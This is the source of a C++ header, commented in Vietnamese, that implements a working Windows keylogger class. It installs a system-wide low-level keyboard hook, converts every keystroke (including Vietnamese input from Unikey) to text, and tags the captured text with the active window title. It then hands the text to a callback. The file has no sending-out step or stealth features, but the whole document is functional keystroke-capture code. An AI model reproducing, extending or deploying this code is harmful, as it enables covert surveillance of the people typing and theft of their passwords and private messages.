#pragma once

#include <iostream>
#include <fstream>
#include <functional>
#include <atomic>
#include <thread>
#include <vector>
#include <string>
#include <mutex> // [FIX] Thêm mutex header

#include <windows.h>
#include <winuser.h>

#pragma comment(lib, "user32.lib")

using KeyEventCallback = std::function<void(std::string)>;

class Keylogging
{
private:
    inline static KeyEventCallback callback = nullptr;
    inline static std::atomic<bool> running{false};
    inline static HHOOK keyboardHook = nullptr;
    inline static std::thread worker;
    inline static std::atomic<DWORD> threadId{0}; // [FIX] Atomic để tránh race condition

    // Biến trạng thái Logic
    inline static bool lastKeyWasPhysical = false;

    // [SỬA] Phân biệt Shift physical vs injected
    inline static bool physicalShiftHeld = false; // Shift từ bàn phím thật

    // [MỚI] Biến lưu tiêu đề cửa sổ cũ
    inline static std::string lastWindowTitle = "";

    // [FIX] Mutex để bảo vệ callback
    inline static std::mutex callbackMutex;

    // [FIX] Helper function để gọi callback an toàn trong HookProc
    // Sử dụng try_lock để tránh blocking hook (có thể gây treo hệ thống)
    static void safeCallback(const std::string& msg)
    {
        if (callbackMutex.try_lock())
        {
            if (callback)
            {
                try
                {
                    callback(msg);
                }
                catch (...)
                {
                    // [FIX] Bắt exception để tránh crash hook
                }
            }
            callbackMutex.unlock();
        }
        // Nếu không lấy được lock, bỏ qua message này (tránh deadlock)
    }

    static std::string WideToUtf8(const std::wstring &ws)
    {
        if (ws.empty())
            return "";
        int len = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string out(len - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, &out[0], len, nullptr, nullptr);
        return out;
    }

    // [MỚI] Hàm lấy tiêu đề cửa sổ
    static std::string GetActiveWindowTitle()
    {
        HWND hwnd = GetForegroundWindow();
        if (!hwnd)
            return "";
        wchar_t title[1024];
        if (GetWindowTextW(hwnd, title, 1024) > 0)
        {
            return WideToUtf8(title);
        }
        return "";
    }

    static LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode == HC_ACTION)
        {
            KBDLLHOOKSTRUCT *pKey = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
            DWORD vk = pKey->vkCode;
            bool isInjected = (pKey->flags & LLKHF_INJECTED) != 0;

            // --- 1. THEO DÕI TRẠNG THÁI SHIFT CHỈ TỪ PHYSICAL KEY ---
            if (!isInjected && (vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_SHIFT))
            {
                if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
                    physicalShiftHeld = true;
                else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
                    physicalShiftHeld = false;
            }

            // Chỉ xử lý sự kiện KeyDown (Nhấn phím)
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
            {
                // ============================================================
                // [MỚI] KIỂM TRA CỬA SỔ TRƯỚC KHI XỬ LÝ PHÍM
                // ============================================================
                // Chỉ kiểm tra khi là phím thật (để tránh check liên tục khi Unikey gửi phím ảo)
                if (!isInjected)
                {
                    std::string currentTitle = GetActiveWindowTitle();
                    if (!currentTitle.empty() && currentTitle != lastWindowTitle)
                    {
                        lastWindowTitle = currentTitle;
                        // [FIX] Sử dụng safeCallback
                        safeCallback("\n\n[ " + currentTitle + " ]\n");
                    }
                }
                // ============================================================

                // ============================================================
                // A. XỬ LÝ PHÍM VẬT LÝ (CODE CŨ CỦA BẠN - GIỮ NGUYÊN)
                // ============================================================
                if (!isInjected)
                {
                    if ((vk >= 0xA0 && vk <= 0xA5) || vk == VK_CAPITAL ||
                        (vk >= VK_F1 && vk <= VK_F24) || vk == VK_LWIN || vk == VK_RWIN)
                    {
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }

                    lastKeyWasPhysical = true;

                    if (vk == VK_BACK)
                    {
                        safeCallback("[BACKSPACE]"); // [FIX] Sử dụng safeCallback
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }
                    if (vk == VK_RETURN)
                    {
                        safeCallback("\n"); // [FIX] Sử dụng safeCallback
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }
                    if (vk == VK_TAB)
                    {
                        safeCallback("\t"); // [FIX] Sử dụng safeCallback
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }

                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    // [SỬA] Chỉ dùng physical Shift state
                    keyboardState[VK_SHIFT] = physicalShiftHeld ? 0x80 : 0;
                    keyboardState[VK_LSHIFT] = physicalShiftHeld ? 0x80 : 0;
                    keyboardState[VK_RSHIFT] = physicalShiftHeld ? 0x80 : 0;

                    if (GetKeyState(VK_CAPITAL) & 0x0001)
                        keyboardState[VK_CAPITAL] = 0x01;

                    wchar_t buffer[16] = {0};
                    HKL hkl = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), nullptr));
                    int ret = ToUnicodeEx(vk, pKey->scanCode, keyboardState, buffer, 16, 0, hkl);

                    if (ret > 0 && buffer[0] >= 32)
                    {
                        safeCallback(WideToUtf8(buffer)); // [FIX] Sử dụng safeCallback
                    }
                    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                }

                // ============================================================
                // B. XỬ LÝ PHÍM ẢO (CODE CŨ CỦA BẠN - GIỮ NGUYÊN)
                // ============================================================
                else
                {
                    if (vk == VK_BACK)
                    {
                        if (lastKeyWasPhysical)
                        {
                            // [FIX] Sử dụng safeCallback
                            safeCallback("[BACKSPACE]");
                            safeCallback("[BACKSPACE]");
                            lastKeyWasPhysical = false;
                        }
                        else
                        {
                            safeCallback("[BACKSPACE]"); // [FIX] Sử dụng safeCallback
                        }
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }

                    if (vk == VK_PACKET)
                    {
                        wchar_t ch = static_cast<wchar_t>(pKey->scanCode);
                        if (ch != 0)
                        {
                            std::wstring ws(1, ch);
                            safeCallback(WideToUtf8(ws)); // [FIX] Sử dụng safeCallback
                        }
                        lastKeyWasPhysical = false;
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }

                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    // Logic quan trọng cho tiếng Việt: Reset Shift khi là phím ảo
                    keyboardState[VK_SHIFT] = 0;
                    if (GetKeyState(VK_CAPITAL) & 0x0001)
                        keyboardState[VK_CAPITAL] = 0x01;

                    wchar_t buffer[16] = {0};
                    HKL hkl = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), nullptr));
                    int ret = ToUnicodeEx(vk, pKey->scanCode, keyboardState, buffer, 16, 0, hkl);

                    if (ret > 0 && buffer[0] >= 32)
                    {
                        safeCallback(WideToUtf8(buffer)); // [FIX] Sử dụng safeCallback
                        lastKeyWasPhysical = false;
                    }
                    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                }
            }
        }
        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
    }

    static void Loop()
    {
        threadId.store(GetCurrentThreadId()); // [FIX] Atomic store

        // [FIX] Reset tất cả trạng thái khi bắt đầu
        physicalShiftHeld = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        lastWindowTitle = "";
        lastKeyWasPhysical = false; // [FIX] Reset trạng thái

        HINSTANCE hInst = GetModuleHandle(nullptr);
        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hInst, 0);
        if (!keyboardHook)
        {
            running.store(false);
            threadId.store(0); // [FIX] Reset threadId khi thất bại
            return;
        }

        std::string title = GetActiveWindowTitle();
        if (!title.empty())
        {
            lastWindowTitle = title;
            std::lock_guard<std::mutex> lock(callbackMutex); // [FIX] Bảo vệ callback
            if (callback)
            {
                callback("\n\n[ " + title + " ]\n");
            }
        }

        MSG msg;
        while (running.load() && GetMessage(&msg, nullptr, 0, 0)) // [FIX] Kiểm tra running
        {
            if (msg.message == WM_QUIT)
                break;
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        
        // [FIX] Cleanup an toàn
        if (keyboardHook)
        {
            UnhookWindowsHookEx(keyboardHook);
            keyboardHook = nullptr;
        }
        threadId.store(0);
    }

public:
    static void setCallback(KeyEventCallback cb) 
    { 
        std::lock_guard<std::mutex> lock(callbackMutex); // [FIX] Thread-safe callback assignment
        callback = cb; 
    }
    
    static void start()
    {
        if (running.load())
            return;
        running.store(true);
        worker = std::thread(Loop);
    }
    
    static void stop()
    {
        if (!running.load())
            return;
        running.store(false);
        
        // [FIX] Lấy threadId an toàn với atomic
        DWORD tid = threadId.load();
        if (tid != 0)
            PostThreadMessage(tid, WM_QUIT, 0, 0);
            
        if (worker.joinable())
            worker.join();
            
        // [FIX] Reset trạng thái để tránh lỗi khi start lại
        physicalShiftHeld = false;
        lastKeyWasPhysical = false;
        lastWindowTitle = "";
    }
    
    // [FIX] Thêm hàm kiểm tra trạng thái
    static bool isRunning()
    {
        return running.load();
    }
};